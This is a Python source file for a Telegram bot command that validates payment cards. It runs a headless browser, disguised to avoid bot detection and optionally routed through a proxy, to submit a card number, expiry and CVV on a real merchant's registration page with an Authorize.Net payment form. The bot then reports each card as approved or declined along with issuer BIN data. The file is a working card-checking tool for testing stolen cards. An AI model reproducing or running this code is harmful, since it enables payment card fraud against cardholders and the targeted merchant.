import re
import logging
from telegram import Update
from telegram.ext import ContextTypes

from card_parser import parse_card_input
from security import is_allowed_chat, get_chat_permissions, can_use_command
from api_client import api_client
from response_formatter import format_error_message

logger = logging.getLogger(__name__)

def run_authnet_check(card_number, month, year, cvv, proxy_url=None):
    """
    Execute payment test on AuthNet Gate
    """
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    import random
    import string
    import time
    
    driver = None
    try:
        # Setup Chrome driver with optimized options for speed
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        
        # Optimize for speed
        chrome_options.add_argument("--disable-images")
        chrome_options.add_argument("--disable-javascript")
        chrome_options.add_argument("--disable-plugins")
        chrome_options.add_argument("--disable-extensions")
        
        # User agent
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ]
        chrome_options.add_argument(f"--user-agent={random.choice(user_agents)}")
        
        # Proxy if provided
        if proxy_url:
            chrome_options.add_argument(f'--proxy-server={proxy_url}')
        
        driver = webdriver.Chrome(options=chrome_options)
        wait = WebDriverWait(driver, 15)  # Reduced timeout
        
        # Hide automation
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
        # GENERATE CREDENTIALS
        def generate_credentials():
            first_name = random.choice(['John', 'Mike', 'David', 'Robert', 'James'])
            last_name = random.choice(['Smith', 'Johnson', 'Williams', 'Brown', 'Jones'])
            username = ''.join(random.choices(string.ascii_lowercase, k=8))
            password = "TestPassword123!"
            email = f"{username}@test.com"
            return first_name, last_name, username, email, password
        
        print("🔄 Accessing registration page...")
        driver.get("https://tempestprotraining.com/register/")
        time.sleep(3)  # Reduced wait time
        
        # Generate credentials
        first_name, last_name, username, email, password = generate_credentials()
        card_data = {
            'number': card_number,
            'cvv': cvv,
            'expiry_month': month,
            'expiry_year': year
        }
        
        print(f"👤 Credentials: {first_name} {last_name} - {username}")
        print(f"💳 Card: {card_data['number'][:6]}******{card_data['number'][-4:]}")
        
        # FILL BASIC INFORMATION
        # Username
        username_selectors = ["input[name='user_login']", "#arm-df__form-control_217_1_IRCqY93ujw"]
        for selector in username_selectors:
            try:
                username_field = driver.find_element(By.CSS_SELECTOR, selector)
                username_field.clear()
                username_field.send_keys(username)
                print("✅ Username filled")
                break
            except:
                continue
        
        # First Name
        first_name_selectors = ["input[name='first_name']", "#first_name"]
        for selector in first_name_selectors:
            try:
                first_name_field = driver.find_element(By.CSS_SELECTOR, selector)
                first_name_field.clear()
                first_name_field.send_keys(first_name)
                print("✅ First Name filled")
                break
            except:
                continue
        
        # Last Name
        last_name_selectors = ["input[name='last_name']", "#last_name"]
        for selector in last_name_selectors:
            try:
                last_name_field = driver.find_element(By.CSS_SELECTOR, selector)
                last_name_field.clear()
                last_name_field.send_keys(last_name)
                print("✅ Last Name filled")
                break
            except:
                continue
        
        # Email
        email_selectors = ["input[name='user_email']", "#arm-df__form-control_220_1_IRCqY93ujw"]
        for selector in email_selectors:
            try:
                email_field = driver.find_element(By.CSS_SELECTOR, selector)
                email_field.clear()
                email_field.send_keys(email)
                print("✅ Email filled")
                break
            except:
                continue
        
        # Password
        password_selectors = ["input[name='user_pass']", "#arm-df__form-control_221_1_IRCqY93ujw"]
        for selector in password_selectors:
            try:
                password_field = driver.find_element(By.CSS_SELECTOR, selector)
                password_field.clear()
                password_field.send_keys(password)
                print("✅ Password filled")
                break
            except:
                continue
        
        # Checkbox Terms
        checkbox_selectors = ["input[name='terms']", "input[type='checkbox']"]
        for selector in checkbox_selectors:
            try:
                terms_checkbox = driver.find_element(By.CSS_SELECTOR, selector)
                if not terms_checkbox.is_selected():
                    driver.execute_script("arguments[0].click();", terms_checkbox)
                    print("✅ Terms checkbox selected")
                    break
            except:
                continue
        
        time.sleep(1)  # Reduced wait
        
        # FILL PAYMENT INFORMATION
        # Card Number
        card_selectors = ["input[name='authorize_net[card_number]']", "#arm_authorize_net_card_number_QhvwJCC6J6"]
        for selector in card_selectors:
            try:
                card_field = driver.find_element(By.CSS_SELECTOR, selector)
                card_field.clear()
                # Faster typing
                card_field.send_keys(card_data['number'])
                print("✅ Card number filled")
                break
            except:
                continue
        
        time.sleep(1)
        
        # Expiry Month
        month_selectors = ["input[name='authorize_net[exp_month]']", "#arm_authorize_net_exp_month_QhvwJCC6J6"]
        for selector in month_selectors:
            try:
                month_field = driver.find_element(By.CSS_SELECTOR, selector)
                month_field.clear()
                month_field.send_keys(card_data['expiry_month'])
                print("✅ Expiry month filled")
                break
            except:
                continue
        
        # Expiry Year
        year_selectors = ["input[name='authorize_net[exp_year]']", "#arm_authorize_net_exp_year_QhvwJCC6J6"]
        for selector in year_selectors:
            try:
                year_field = driver.find_element(By.CSS_SELECTOR, selector)
                year_field.clear()
                year_field.send_keys(card_data['expiry_year'])
                print("✅ Expiry year filled")
                break
            except:
                continue
        
        time.sleep(1)
        
        # CVV
        cvv_selectors = ["input[name='authorize_net[cvc]']", "#arm_authorize_net_cvc_QhvwJCC6J6"]
        for selector in cvv_selectors:
            try:
                cvv_field = driver.find_element(By.CSS_SELECTOR, selector)
                cvv_field.clear()
                cvv_field.send_keys(card_data['cvv'])
                print("✅ CVV filled")
                break
            except:
                continue
        
        # Manual Payment
        manual_selectors = ["input[value*='manual']", "input[name*='manual']"]
        for selector in manual_selectors:
            try:
                manual_field = driver.find_element(By.CSS_SELECTOR, selector)
                if not manual_field.is_selected():
                    driver.execute_script("arguments[0].click();", manual_field)
                    print("✅ Manual Payment selected")
                    break
            except:
                continue
        
        time.sleep(2)
        
        # SUBMIT
        submit_selectors = ["button[type='submit']", "input[type='submit']", "#submit"]
        for selector in submit_selectors:
            try:
                submit_btn = driver.find_element(By.CSS_SELECTOR, selector)
                if submit_btn.is_displayed():
                    driver.execute_script("arguments[0].click();", submit_btn)
                    print("✅ Form submitted")
                    break
            except:
                continue
        
        print("🔄 Processing payment...")
        time.sleep(8)  # Reduced from 10 to 8 seconds
        
        # 🆕 ANALYZE RESULT - CON RICONOSCIMENTO 3DS
        current_url = driver.current_url
        page_text = driver.page_source
        page_text_lower = page_text.lower()
        
        print(f"📄 Final URL: {current_url}")
        
        # 🎯 3DS PAGE DETECTION
        three_ds_indicators = [
            "3dsecure", "acs.", "securecode", "verifiedbyvisa", 
            "mastercardsecurecode", "protectbuy", "otp", "one-time",
            "challenge", "authentication", "redirect", "bankauth",
            "threedsecure", "3ds.", "secure3d", "cardinalcommerce",
            "mpi.", "issuer.", "bank.", "auth."
        ]
        
        # Check URL for 3DS
        for indicator in three_ds_indicators:
            if indicator in current_url.lower():
                print(f"🎯 3DS URL DETECTED: {indicator}")
                return "APPROVED", "3DS Authentication Required"
        
        # Check page content for 3DS
        for indicator in three_ds_indicators:
            if indicator in page_text_lower:
                print(f"🎯 3DS CONTENT DETECTED: {indicator}")
                return "APPROVED", "3DS Authentication Required"
        
        # Check for 3DS form elements
        three_ds_elements = [
            "[action*='3dsecure']",
            "[action*='acs']",
            "input[name*='otp']",
            "input[name*='password']",
            "input[name*='auth']",
            "#otp", "#password", "#authCode", "#securityCode",
            ".challenge-frame", ".authentication-window", ".otp-container",
            ".3ds-frame", ".bank-auth", ".secure-code"
        ]
        
        for element in three_ds_elements:
            try:
                elements = driver.find_elements(By.CSS_SELECTOR, element)
                for elem in elements:
                    if elem.is_displayed():
                        print(f"🎯 3DS ELEMENT FOUND: {element}")
                        return "APPROVED", "3DS Authentication Required"
            except:
                continue
        
        # 🎯 SUCCESS AFTER 3DS
        success_after_3ds = [
            "returnUrl", "success", "thankyou", "order-received",
            "payment-complete", "transaction-complete", "order-confirmation",
            "checkout/order-received", "thank-you", "success-page"
        ]
        
        for indicator in success_after_3ds:
            if indicator in current_url.lower() or indicator in page_text_lower:
                print(f"🎯 SUCCESS AFTER 3DS: {indicator}")
                return "APPROVED", "Payment Successful (3DS Completed)"
        
        # STRATEGY 1: EXTRACT EXACT ERROR MESSAGES FROM AUTHORIZE.NET
        authnet_error_patterns = [
            r'this transaction has been declined',
            r'your card was declined',
            r'card declined',
            r'the credit card number is invalid',
            r'the card has expired',
            r'the cvv number is invalid',
            r'insufficient funds',
            r'do not honor',
            r'transaction not allowed',
            r'duplicate transaction',
            r'double transaction submitted'
        ]
        
        # Search for exact error messages in page text
        for pattern in authnet_error_patterns:
            match = re.search(pattern, page_text_lower, re.IGNORECASE)
            if match:
                exact_message = match.group(0)
                print(f"🔴 EXACT ERROR MESSAGE FOUND: '{exact_message}'")
                return "DECLINED", exact_message.title()
        
        # STRATEGY 2: LOOK FOR ERROR MESSAGES IN SPECIFIC ELEMENTS
        error_containers = [
            ".authorize-net-error",
            ".payment-error",
            ".woocommerce-error",
            ".gateway-error",
            "[class*='error']",
            "[class*='declin']",
            "div[role='alert']",
            ".alert",
            ".notice",
            ".message"
        ]
        
        for container in error_containers:
            try:
                elements = driver.find_elements(By.CSS_SELECTOR, container)
                for element in elements:
                    if element.is_displayed():
                        error_text = element.text.strip()
                        if error_text and len(error_text) > 10:
                            # Filter out generic messages
                            if not any(generic in error_text.lower() for generic in 
                                      ['username', 'email', 'password', 'required field', 'please complete']):
                                print(f"🔴 ERROR IN CONTAINER: '{error_text}'")
                                return "DECLINED", error_text
            except:
                continue
        
        # STRATEGY 3: CHECK IF STILL ON REGISTRATION PAGE WITH ERRORS
        if "register" in current_url:
            # Look for any validation errors
            validation_errors = [
                "can not be left blank",
                "should not be blank", 
                "is required",
                "invalid",
                "already registered"
            ]
            
            for error in validation_errors:
                if error in page_text_lower:
                    return "DECLINED", f"Validation error: {error}"
            
            return "DECLINED", "Payment failed - Still on registration page"
        
        # STRATEGY 4: CHECK FOR SUCCESS
        success_indicators = [
            "my-account", "dashboard", "thank you", "welcome",
            "account created", "payment successful", "transaction complete"
        ]
        
        for indicator in success_indicators:
            if indicator in current_url or indicator in page_text_lower:
                print(f"✅ SUCCESS INDICATOR FOUND: '{indicator}'")
                return "APPROVED", "Payment successful"
        
        # Default: if we're not on registration page and no errors found, assume success
        if "tempestprotraining.com/register" not in current_url:
            return "APPROVED", "Payment completed successfully"
        
        # Final fallback
        return "DECLINED", "Unable to process payment"
                
    except Exception as e:
        print(f"❌ Error during test: {e}")
        return "ERROR", str(e)
    finally:
        if driver:
            driver.quit()

async def authnet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check card with AuthNet Gate"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    chat_type = update.effective_chat.type
    
    if not is_allowed_chat(chat_id, chat_type, user_id):
        permission_info = get_chat_permissions(chat_id, chat_type, user_id)
        await update.message.reply_text(f"❌ {permission_info}")
        return
    
    can_use, error_msg = can_use_command(user_id, 'au')
    if not can_use:
        await update.message.reply_text(error_msg)
        return
    
    if not context.args:
        await update.message.reply_text(
            "🎯 **AuthNet Gate Check**\n\n"
            "Usage: /au number|month|year|cvv [proxy]\n\n"
            "Example: /au 4147400214647297|12|2026|123\n"
            "With proxy: /au 4147400214647297|12|2026|123 http://proxy-ip:port"
        )
        return
    
    # COMBINE ALL ARGUMENTS
    full_input = ' '.join(context.args)
    logger.info(f"🔍 Full input: {full_input}")
    
    # FIND PROXY
    proxy_match = re.search(r'(https?://[^\s]+)', full_input)
    proxy_url = proxy_match.group(0) if proxy_match else None
    
    # REMOVE PROXY FROM INPUT
    if proxy_url:
        card_input = full_input.replace(proxy_url, '').strip()
        logger.info(f"🔌 Proxy found: {proxy_url}")
    else:
        card_input = full_input
    
    # CLEAN SPACES
    card_input = re.sub(r'\s+', ' ', card_input).strip()
    
    if proxy_url:
        wait_message = await update.message.reply_text(f"🔄 Checking AuthNet with proxy...")
    else:
        wait_message = await update.message.reply_text("🔄 Checking AuthNet...")
    
    try:
        parsed_card = parse_card_input(card_input)
        
        if not parsed_card['valid']:
            await wait_message.edit_text(format_error_message('invalid_format', parsed_card['error']))
            return
        
        logger.info(f"🎯 Card parsed: {parsed_card['number'][:6]}******{parsed_card['number'][-4:]}")
        
        # GET BIN INFORMATION
        bin_number = parsed_card['number'][:6]
        bin_result = api_client.bin_lookup(bin_number)
        
        # EXECUTE AUTHNET CHECK
        status, message = run_authnet_check(
            parsed_card['number'],
            parsed_card['month'],
            parsed_card['year'],
            parsed_card['cvv'],
            proxy_url=proxy_url
        )
        
        # FORMAT RESPONSE LIKE STRIPE
        if status == "APPROVED":
            response = f"""Approved ✅

Card: {parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}
Gateway: authent $32
Response: {message}"""
        elif status == "DECLINED":
            response = f"""Declined ❌

Card: {parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}
Gateway: authnet $32
Response: {message}"""
        else:
            response = f"""Error ⚠️

Card: {parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}
Gateway: authnet $32
Response: {message}"""
        
        # ADD BIN INFO IF AVAILABLE
        if bin_result and bin_result['success']:
            bin_data = bin_result['data']
            response += f"""

BIN Info:
Country: {bin_data.get('country', 'N/A')}
Issuer: {bin_data.get('issuer', 'N/A')}
Scheme: {bin_data.get('scheme', 'N/A')}
Type: {bin_data.get('type', 'N/A')}
Tier: {bin_data.get('tier', 'N/A')}"""
        
        await wait_message.edit_text(response)
        
    except Exception as e:
        logger.error(f"❌ Error in authnet_command: {e}")
        await wait_message.edit_text(f"❌ Error: {str(e)}")

